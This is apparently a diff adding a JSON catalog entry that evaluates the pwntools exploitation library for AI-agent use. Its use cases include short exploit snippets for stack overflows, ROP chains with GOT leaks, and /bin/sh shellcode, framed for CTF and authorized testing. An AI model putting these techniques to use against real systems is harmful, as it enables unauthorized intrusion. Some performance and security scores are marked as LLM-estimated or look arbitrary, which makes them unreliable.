@@ -1,0 +1,106 @@
+{
+  "id": "pwntools-python-api",
+  "name": "pwntools",
+  "version_evaluated": "4.x",
+  "homepage": "https://docs.pwntools.com/",
+  "repo_url": "https://github.com/Gallopsled/pwntools",
+  "category": "developer-tools",
+  "subcategories": ["security", "python", "ctf", "exploitation", "binary-analysis"],
+  "tags": ["python", "pwntools", "ctf", "exploit", "binary", "rop", "shellcode", "pwn", "security"],
+  "what_it_does": "CTF exploitation framework and binary interaction library for Python — provides tools for writing exploits, interacting with processes/sockets, and binary analysis. pwntools features: process()/remote() for process/socket interaction, tubes with send()/recv()/recvuntil()/sendlineafter(), ELF() for binary analysis (symbols, got, plt, bss), ROP() for return-oriented programming chain building, shellcraft for shellcode generation (shellcraft.sh()), asm()/disasm() for assembly, cyclic() for de Bruijn pattern generation, p32()/p64()/u32()/u64() for packing, context for architecture setting, and logging. Standard tool for CTF competitions and authorized penetration testing binary exploitation.",
+  "use_cases": [
+    "Agent CTF binary exploitation — from pwn import *; context.binary = elf = ELF('./vulnerable'); p = process('./vulnerable'); offset = cyclic_find(0x61616171); payload = cyclic(offset) + p64(elf.sym['win']); p.sendlineafter(b'> ', payload); p.interactive() — buffer overflow to redirect execution; agent CTF solver automates exploit development for stack smashing challenges",
+    "Agent remote service interaction — r = remote('challenge.ctf.site', 9001); r.recvuntil(b'Name: '); r.sendline(b'payload'); response = r.recvall() — interact with CTF challenge server; agent CTF automation handles multi-round network protocols; timeout and retry built in",
+    "Agent ROP chain building — elf = ELF('./binary'); rop = ROP(elf); rop.call(elf.plt['puts'], [elf.got['puts']]); rop.call(elf.sym['main']); payload = b'A'*offset + rop.chain() — build return-oriented programming chain from available gadgets; agent automates GOT leak + ret2libc exploitation pattern",
+    "Agent shellcode generation — context.arch = 'amd64'; context.os = 'linux'; shellcode = asm(shellcraft.sh()); payload = shellcode + b'A'*(offset-len(shellcode)) + p64(return_addr) — generate execve('/bin/sh') shellcode for target architecture; agent generates architecture-specific shellcode without manual assembly",
+    "Agent binary analysis — elf = ELF('./challenge'); print(hex(elf.sym['main'])); print(hex(elf.got['printf'])); print(hex(elf.bss())); strings = list(elf.search(b'/bin/sh')) — extract symbol addresses, GOT entries, and strings from ELF binary; agent exploit development maps binary memory layout before building payload"
+  ],
+  "not_for": [
+    "Production security tooling — pwntools is for CTF and authorized testing; for production vuln scanning use Nessus, OpenVAS, or Metasploit",
+    "Unauthorized access — pwntools requires explicit authorization for any real-world target; only use for CTF challenges, your own systems, or authorized engagements",
+    "Web exploitation — pwntools focuses on binary/network exploitation; for web exploit automation use Burp Suite or requests/selenium"
+  ],
+  "best_when": "CTF binary exploitation challenges, authorized penetration testing of binary services, or security research requiring process interaction and exploit development — pwntools provides the complete exploit development toolkit that eliminates boilerplate for CTF competitors.",
+  "avoid_when": "You need web exploitation tools, production vulnerability scanning, or are targeting systems without explicit written authorization.",
+  "alternatives": ["scapy-python-api", "impacket-api"],
+  "interface": {
+    "has_rest_api": false,
+    "has_graphql": false,
+    "has_grpc": false,
+    "has_mcp_server": false,
+    "mcp_server_url": null,
+    "has_sdk": true,
+    "sdk_languages": ["python"],
+    "openapi_spec_url": null,
+    "webhooks": false
+  },
+  "auth": {
+    "methods": ["none"],
+    "oauth": false,
+    "scopes": false,
+    "notes": "No auth — local exploitation framework. Network connections to CTF challenge servers use standard TCP. CRITICAL: Only use against systems you own or have explicit written authorization to test."
+  },
+  "pricing": {
+    "model": "open_source",
+    "free_tier_exists": true,
+    "free_tier_limits": "Completely free, MIT licensed",
+    "paid_tiers": "None",
+    "requires_credit_card": false,
+    "notes": "pwntools is MIT licensed. Free for all authorized use."
+  },
+  "performance": {
+    "latency_p50_ms": 50,
+    "latency_p99_ms": 500,
+    "uptime_sla_percent": null,
+    "rate_limits": "No rate limits for local process interaction. Remote() latency depends on network and CTF server. ROP gadget searching on large binaries may take 10-30 seconds. Shellcode assembly is near-instant.",
+    "data_source": "llm_estimated"
+  },
+  "requirements": {
+    "requires_signup": false,
+    "requires_credit_card": false,
+    "domain_verification": false,
+    "data_residency": ["self-hosted"],
+    "compliance": [],
+    "min_contract": "none"
+  },
+  "agent_readiness": {
+    "mcp_server_quality": null,
+    "mcp_security_score": null,
+    "documentation_accuracy": 80,
+    "error_message_quality": 78,
+    "error_message_notes": "EOFError when connection closes unexpectedly. PwnlibException for framework errors. context.log_level controls verbosity (DEBUG shows all send/recv). recvuntil() hangs if delimiter not received — set timeout parameter. ELF() raises FileNotFoundError for missing binary.",
+    "idempotency_support": "partial",
+    "idempotency_notes": "ELF analysis is deterministic. cyclic() and cyclic_find() are deterministic. process() creates new process each call — exploit success varies with ASLR, canaries, and process state. Remote connections depend on server state.",
+    "pagination_style": "none",
+    "retry_guidance_documented": false,
+    "known_agent_gotchas": [
+      "context.binary must be set for architecture — asm(shellcraft.sh()) fails without context.arch set; agent exploit code must set: context.binary = ELF('./binary') or context.arch = 'amd64'; context.os = 'linux'; wrong architecture generates wrong shellcode silently",
+      "recvuntil() hangs without timeout — r.recvuntil(b'> ') blocks forever if service never sends expected bytes; agent network exploit code must ALWAYS set timeout: r.recvuntil(b'> ', timeout=10); or set global context.timeout = 10 for all operations",
+      "p64() vs p32() depends on binary bitness — packing 64-bit address with p32() silently truncates; agent exploit for 32-bit binary must use p32() not p64(); check elf.bits or elf.elftype to determine pointer size; use flat() or pack() with automatic size detection",
+      "ASLR means addresses change each run — elf.sym['main'] is the binary base offset, not runtime address; ASLR randomizes base; agent exploit must leak a runtime address (from GOT/stack) to calculate ASLR slide before using hardcoded offsets; static pie binaries always require leak",
+      "ELF().sym vs ELF().plt vs ELF().got differ — elf.sym['func'] is the function's code address; elf.plt['func'] is PLT stub for lazy binding; elf.got['func'] is GOT entry holding resolved address; agent ROP chains calling library functions must use plt not sym for inter-library calls",
+      "from pwn import * pollutes namespace — pwntools exports many names (asm, log, context, process, etc.); agent code doing from pwn import * may shadow Python builtins; large agent codebases should use selective imports or import pwn and use pwn.process() to avoid namespace pollution"
+    ]
+  },
+  "af_score_components": {
+    "mcp_score": 0,
+    "api_doc_score": 78,
+    "error_handling_score": 75,
+    "auth_complexity_score": 90,
+    "rate_limit_clarity_score": 92
+  },
+  "security_score_components": {
+    "tls_enforcement": 78,
+    "auth_strength": 78,
+    "scope_granularity": 75,
+    "dependency_hygiene": 80,
+    "secret_handling": 80,
+    "security_notes": "CRITICAL: Dual-use offensive security tool. Only use against systems you own or have explicit written authorization to test. CTF use and authorized penetration testing are valid use cases. Unauthorized use constitutes computer crime in most jurisdictions. Agent automation of pwntools requires strong authorization verification before targeting any system."
+  },
+  "reliability_score_components": {
+    "uptime_documented": 78,
+    "version_stability": 78,
+    "breaking_changes_history": 75,
+    "error_recovery": 75
+  }
+}
